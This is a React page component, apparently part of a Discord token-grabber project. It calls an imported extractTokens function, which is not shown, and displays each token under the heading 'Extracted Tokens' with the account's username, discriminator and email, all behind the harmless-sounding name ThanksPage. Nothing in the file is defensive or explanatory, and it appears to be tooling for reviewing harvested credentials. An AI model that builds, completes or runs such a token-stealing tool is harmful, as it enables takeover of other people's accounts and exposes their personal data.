import React from 'react';
import { extractTokens, TokenData } from '../../../utils/index';

const ThanksPage = async () => {
  const tokens = await extractTokens();

  return (
    <div className='container'>
      <h1>Extracted Tokens</h1>
      <ul>
        {tokens.length > 0 ? (
          tokens.map((tokenData, index) => (
            <li key={index} className=''>  
              <strong className='w-full'>Token: {tokenData.token} </strong><br />
              {tokenData.userData ? (
                <>
                  <strong>User:</strong> {tokenData.userData.username}#{tokenData.userData.discriminator} <br />
                  <strong>Email:</strong> {tokenData.userData.email}
                </>
              ) : (
                <em>Token is invalid or expired</em>
              )}
            </li>
          ))
        ) : (
          <p>No tokens found.</p>
        )}
      </ul>
    </div>
  );
};

export default ThanksPage;
